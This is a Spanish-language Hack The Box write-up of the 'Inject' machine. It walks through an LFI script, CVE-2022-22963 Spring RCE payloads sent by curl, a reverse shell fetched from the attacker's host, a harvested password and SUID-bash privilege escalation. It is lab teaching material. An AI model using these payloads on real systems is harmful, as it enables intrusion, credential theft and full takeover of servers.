---
layout: single
title: Inject - Hack The Box
excerpt: "En esta ocasion vamos a estar haciendo la maquina Inject de Hackthebox de dificultad facil donde tendremos que aprovecharnos de un LFI para para enumerar el sistema aparte tendremos que aprovecharnos de una vulnerabilidad para poder subir una reverse shell ala maquina victima y ganar acceso despues migraremos a otro usuario y nos convertiremos en root haciendo la bash SUID"
date: 2023-03-11
classes: wide
header:
  teaser: /assets/images/htb-writeup-inject/icon2.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - LFI
  - Bash Scripting
  - CVE-2022-22963
  - Ansible-playbook
---

<p align="center">
<img src="/assets/images/htb-writeup-inject/icon2.png">
</p>

```bash
❯ ping -c 1 10.129.178.70
PING 10.129.178.70 (10.129.178.70) 56(84) bytes of data.
64 bytes from 10.129.178.70: icmp_seq=1 ttl=63 time=178 ms

--- 10.129.178.70 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 177.975/177.975/177.975/0.000 ms
❯ whichSystem.py 10.129.178.70

10.129.178.70 (ttl -> 63): Linux

```

## PortScan

```bash
❯ nmap -sCV -p22,8080 10.129.178.70 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-11 17:01 CST
Nmap scan report for 10.129.178.70
Host is up (0.20s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Enumeration

```bash
❯ whatweb http://10.129.178.70:8080
http://10.129.178.70:8080 [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Frame, HTML5, IP[10.129.178.70], Title[Home], YouTube
```

Antes de ver la web vamos a ver hacer un simple escaneo de `dirsearch` para ver si encontramos algo

La primer linea se ve interesante no se si sea vulnerable a `LFI` por la respuesta que nos estan dando vamos a ver

```bash
❯ dirsearch -u http://10.129.178.70:8080

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/10.129.178.70:8080/_23-03-11_17-04-20.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-03-11_17-04-20.log

Target: http://10.129.178.70:8080/

[17:04:21] Starting: 
[17:04:49] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[17:04:52] 400 -  435B  - /a%5c.aspx
[17:05:19] 200 -    5KB - /blogs
[17:05:38] 500 -  106B  - /error
[17:05:38] 500 -  106B  - /error/
[17:06:14] 200 -    6KB - /register
[17:06:27] 200 -    2KB - /upload
[17:06:27] 200 -    2KB - /upload/

Task Completed
```

Solo funciona la parte de `upload` 

![](/assets/images/htb-writeup-inject/Web1.png)

Vamos a ver las rutas de que nos mostro `dirsearch`

Vemos esto en `/blogs`

![](/assets/images/htb-writeup-inject/Web2.png)

Vemos esto en `register`

![](/assets/images/htb-writeup-inject/Web3.png)

Esta es la parte de `upload`

![](/assets/images/htb-writeup-inject/Web4.png)

Si subimos cualquier cosa funciona

![](/assets/images/htb-writeup-inject/Web5.png)

Pero si intentamos ver la imagen nos da error

![](/assets/images/htb-writeup-inject/Web6.png)

Si pongo esto me da un error diferente 

![](/assets/images/htb-writeup-inject/Web7.png)

Probe hacerlo en `Base64` para ver si cambiaba algo pero da error

```bash
❯ echo -n "\..\..\..\..\..\..\..\..\..\etc\passwd" | base64
XC4uXC4uXC4uXC4uXC4uXC4uXC4uXC4uXC4uG3RjXHBhc3N3ZA==

❯ echo -n "/../../../../../../../../../etc/passwd" | base64
Ly4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2Q=
```

Si hacemos la prueba con `Burpsuite` funciona

![](/assets/images/htb-writeup-inject/burp.png)

Estos usuarios tiene una `Bash`

```bash
❯ curl -s -X GET "http://10.129.178.70:8080/show_image?img=../../../../../../etc/passwd" | grep sh
root:x:0:0:root:/root:/bin/bash
frank:x:1000:1000:frank:/home/frank:/bin/bash
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin

```

Vamos a hacer un script en `Bash` para automatizar el `LFI`

```bash
#!/bin/bash 

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
  echo -e "\n\n${redColour}[!] Saliendo...${endColour}"
  exit 1
}

#Ctrl + c
trap ctrl_c INT # esto va a la funcion ctrl_c()

declare -i parameter_counter=0 # declaramos una variable int

function fileRead(){
  filename=$1
  echo -e "\n${yellowColour}[+]${endColour}${grayColour} Este es el contenido del archivo ${endColour}${redColour}$filename${endColour}${grayColour}:${endColour}\n"
  curl -s -X GET "http://10.129.178.70:8080/show_image?img=../../../../../..$filename"
}

function helpPanel(){
  echo -e "\n${yellowColour}[i]${endColour}${grayColour}Uso:${endColour}\n"
  echo -e "\t${redColour}h)${endColour}${blueColour} Mostrar este panel de ayuda${endColour}"
  echo -e "\t${redColour}f)${endColour}${blueColour} Proporcionar ruta del archivo a leer\n${endColour}"
  exit 0
}

#Menu cuando quieres que se te pase un argumento poner : despues de la opcion 
while getopts "hf:" arg; do
  case $arg in
    h) ;; # no hace nada por que es un panel de ayuda
    f) filename=$OPTARG; let parameter_counter+=1; # lo que le pases lo mete en la variable filename
  esac
done

if [ $parameter_counter -eq 1 ]; then
  fileRead "$filename"
else
  helpPanel
fi
```

En el directorio del usuario `phil` podemos ver la `user.txt`

```bash
❯ ./lfi.sh -f /home/phil

[+] Este es el contenido del archivo /home/phil:

.bash_history
.bashrc
.cache
.profile
user.txt
```

Si tratamos de ver la `id_rsa` no podremos verla ya que no esta el directorio `.ssh` lo cual es raro

```bash
❯ ./lfi.sh -f /home/phil/.ssh/id_rsa

[+] Este es el contenido del archivo /home/phil/.ssh/id_rsa:

{"timestamp":"2023-03-11T23:44:50.834+00:00","status":500,"error":"Internal Server Error","message":"URL [file:/var/www/WebApp/src/main/uploads/../../../../../../home/phil/.ssh/id_rsa] cannot be resolved in the file system for checking its content length","path":"/show_image"}#   
```

Si enumeramos encontramos esto

```bash
❯ ./lfi.sh -f /var/www/WebApp/.idea/compiler.xml

[+] Este es el contenido del archivo /var/www/WebApp/.idea/compiler.xml:

<?xml version="1.0" encoding="UTF-8"?>
<project version="4">
  <component name="CompilerConfiguration">
    <annotationProcessing>
      <profile name="Maven default annotation processors profile" enabled="true">
        <sourceOutputDir name="target/generated-sources/annotations" />
        <sourceTestOutputDir name="target/generated-test-sources/test-annotations" />
        <outputRelativeToContentRoot value="true" />
        <module name="WebApp" />
      </profile>
    </annotationProcessing>
  </component>
  <component name="JavacSettings">
    <option name="ADDITIONAL_OPTIONS_OVERRIDE">
      <module name="WebApp" options="-parameters" />
    </option>
  </component>
</project>#       
```

Aqui vemos como funciona por detras la parte del `LFI`

```bash
❯ ./lfi.sh -f /var/www/WebApp/target/classes/templates/upload.html

[+] Este es el contenido del archivo /var/www/WebApp/target/classes/templates/upload.html:

<!DOCTYPE html>
<html lang="en" xmlns:th="http://www.thymeleaf.org">
<head>
    <meta charset="UTF-8">
    <title>Upload</title>
    <link rel="stylesheet" type="text/css" href="/webjars/bootstrap/css/bootstrap.min.css" />
</head>
<body>
<header id="header">
    <nav id="nav-bar" class="navbar navbar-expand-lg navbar-dark bg-dark">
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
            <ul class="navbar-nav">
                <li class="nav-item active">
                    <a class="nav-link" th:href="@{/}">Home</span></a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#features">Features</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#how-it-works">How it Works</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" th:href="@{/blogs}">Blogs</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#pricing">Pricing</a>
                </li>
            </ul>
        </div>
    </nav>
</header>

<div class="container" align="center">

        <br>
        <h4 class="text-success">[[${message}]]</h4>
        <a class="text-success" th:if="${name != null}" th:href="@{'/show_image?img=' + ${name}}">View your Image</a>
        <br>
        <div class="mb-3">
            <form th:action="@{/upload}" method="post" enctype="multipart/form-data">
                <input class="form-control" name="file" type="file" id="formFile"><br />

                <input type="submit" value="Upload" class="btn btn-warning">
            </form>
        </div>

</div>


</body>
</html>#      
```

`Frank` corre eso

```bash
❯ ./lfi.sh -f /etc/systemd/system/webapp.service

[+] Este es el contenido del archivo /etc/systemd/system/webapp.service:

[Unit]
Description=Spring WEb APP
After=syslog.target

[Service]
User=frank
Group=frank
ExecStart=/usr/bin/java -Ddebug -jar /var/www/WebApp/target/spring-webapp.jar
Restart=always
StandardOutput=syslog
StandardError=syslog

[Install]
WantedBy=multi-user.target
```

Hay una dependencia de `spring` la cual es vulnerable <https://github.com/me2nuk/CVE-2022-22963> si ejecutamos el comando nos va a crear un directorio `pwned`

<a href='https://github.com/me2nuk/CVE-2022-22963' style='color: yellow'>CVE-2022-22963</a>

```bash
❯ curl -X POST  http://10.129.178.70:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.129.178.70:8080...
* Connected to 10.129.178.70 (10.129.178.70) port 8080 (#0)
> POST /functionRouter HTTP/1.1
> Host: 10.129.178.70:8080
> User-Agent: curl/7.87.0
> Accept: */*
> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")
> Content-Length: 4
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 500 
< Content-Type: application/json
< Transfer-Encoding: chunked
< Date: Sun, 12 Mar 2023 00:07:14 GMT
< Connection: close
< 
* Closing connection 0
{"timestamp":"2023-03-12T00:07:14.058+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}# 
```

```bash
❯ ./lfi.sh -f /tmp

[+] Este es el contenido del archivo /tmp:

.font-unix
.ICE-unix
.Test-unix
.X11-unix
.XIM-unix
hsperfdata_frank
pwned
systemd-private-840313210de241c39ba0368a2586a260-ModemManager.service-ymXHsh
systemd-private-840313210de241c39ba0368a2586a260-systemd-logind.service-26MTMf
systemd-private-840313210de241c39ba0368a2586a260-systemd-resolved.service-GKn8Of
systemd-private-840313210de241c39ba0368a2586a260-systemd-timesyncd.service-ZBQ44g
tomcat.8080.11658069285978605584
tomcat-docbase.8080.14595190991935612181
vmware-root_738-2999591909
```

Como podemos crear cosas vamos a subir una `reverse shell`

```bash
❯ catn reverse.sh
#!/bin/bash

bash -i >& /dev/tcp/IP/443 0>&1
```

Lo subimos ala maquina

```bash
❯ curl -X POST  http://10.129.178.70:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.15.51:80/reverse.sh -o /tmp/rev")' --data-raw 'data' -v
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.129.178.70:8080...
* Connected to 10.129.178.70 (10.129.178.70) port 8080 (#0)
> POST /functionRouter HTTP/1.1
> Host: 10.129.178.70:8080
> User-Agent: curl/7.87.0
> Accept: */*
> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.15.51:80/reverse.sh -o /tmp/rev")
> Content-Length: 4
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 500 
< Content-Type: application/json
< Transfer-Encoding: chunked
< Date: Sun, 12 Mar 2023 00:13:27 GMT
< Connection: close
< 
* Closing connection 0
{"timestamp":"2023-03-12T00:13:27.593+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}#   
```

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.178.70 - - [11/Mar/2023 18:13:29] "GET /reverse.sh HTTP/1.1" 200 -
```

```bash
❯ ./lfi.sh -f /tmp

[+] Este es el contenido del archivo /tmp:

.font-unix
.ICE-unix
.Test-unix
.X11-unix
.XIM-unix
hsperfdata_frank
pwned
rev
```

Ahora vamos a ganar acceso

```bash
❯ curl -X POST  http://10.129.178.70:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/rev")' --data-raw 'data' -v
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.129.178.70:8080...
* Connected to 10.129.178.70 (10.129.178.70) port 8080 (#0)
> POST /functionRouter HTTP/1.1
> Host: 10.129.178.70:8080
> User-Agent: curl/7.87.0
> Accept: */*
> spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/rev")
> Content-Length: 4
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 500 
< Content-Type: application/json
< Transfer-Encoding: chunked
< Date: Sun, 12 Mar 2023 00:19:35 GMT
< Connection: close
< 
* Closing connection 0
{"timestamp":"2023-03-12T00:19:35.455+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}#
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.15.51] from (UNKNOWN) [10.129.178.70] 37198
bash: cannot set terminal process group (783): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ whoami
whoami
frank
frank@inject:/$ 
```

Ejecuta los siguientes comandos

```bash
script /dev/null -c bash
CTRL+Z
stty raw echo; fg
ENTER
reset xterm
ENTER
export TERM=xterm
```

Tendremos que convertirnos en `phil` para poder leer la flag

```bash
frank@inject:/home/phil$ ll
total 24
drwxr-xr-x 3 phil phil 4096 Feb  1 18:38 ./
drwxr-xr-x 4 root root 4096 Feb  1 18:38 ../
lrwxrwxrwx 1 root root    9 Feb  1 07:40 .bash_history -> /dev/null
-rw-r--r-- 1 phil phil 3771 Feb 25  2020 .bashrc
drwx------ 2 phil phil 4096 Feb  1 18:38 .cache/
-rw-r--r-- 1 phil phil  807 Feb 25  2020 .profile
-rw-r----- 1 phil phil   33 Mar 11 22:53 user.txt
frank@inject:/home/phil$ 
```

Nada interesante

```bash
frank@inject:/$ find / -perm -4000 2>/dev/null
/usr/bin/su
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Si nos vamos a `opt` encontramos esto quiero suponer que es una tarea

```bash
frank@inject:/$ cd /opt
frank@inject:/opt$ ls
automation
frank@inject:/opt$ cd automation/
frank@inject:/opt/automation$ ls
tasks
frank@inject:/opt/automation$ cd tasks/
frank@inject:/opt/automation/tasks$ ls
playbook_1.yml
frank@inject:/opt/automation/tasks$ cat playbook_1.yml 
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started
frank@inject:/opt/automation/tasks$ 
```

<a href='https://gtfobins.github.io/gtfobins/ansible-playbook/' style='color: yellow'>Mas informacion sobre ansible-playbook</a>

Tenemos una contraseña

```bash
frank@inject:/opt/automation/tasks$ cd /home/frank
frank@inject:~$ ls
frank@inject:~$ cd .m2/
frank@inject:~/.m2$ ls
settings.xml
frank@inject:~/.m2$ cat settings.xml 
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
frank@inject:~/.m2$ 
```

`phil:DocPhillovestoInject123`

Podemos migrar a `phil`

```bash
frank@inject:~/.m2$ su phil
Password: 
phil@inject:/home/frank/.m2$ whoami
phil
phil@inject:/home/frank/.m2$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
phil@inject:/home/frank/.m2$ 
```

## User flag

```bash
phil@inject:~$ cat user.txt 
320973f5bfc50ddb3e9ae34aa7b4d3fd
phil@inject:~$ 
```

Vamos a usar `pspy` 

<a href='https://github.com/DominicBreuker/pspy/releases' style='color: yellow'>Click para Descargar pspy64</a>

Si lo corremos vemos que esta eliminando esto

```bash
2023/03/12 00:50:11 CMD: UID=0     PID=8752   | /usr/bin/rm -rf /opt/automation/tasks/playbook_1.yml 
```

Borra todo lo que hay y despues yace una copia en la misma ruta

```bash
2023/03/12 00:52:11 CMD: UID=0     PID=8870   | /bin/sh -c sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/ 
```

Cree esto en la ruta `opt/automation/tasks`

```bash
❯ catn pe.yml
- hosts: localhost
  tasks:
    - name: Priv esc
      ansible.builtin.shell: |
        chmod +s /bin/bash
      become: true
```

Lo elimino pero dejo la `Bash` con este permiso

```bash
phil@inject:/tmp$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

## Root

```bash
phil@inject:/tmp$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# ls
playbook_1.yml	root.txt
bash-5.0# cat root.txt 
67395257c1fa5b2fa7ffbbd440568392
bash-5.0# 
```

<https://www.hackthebox.com/achievement/machine/910232/533>


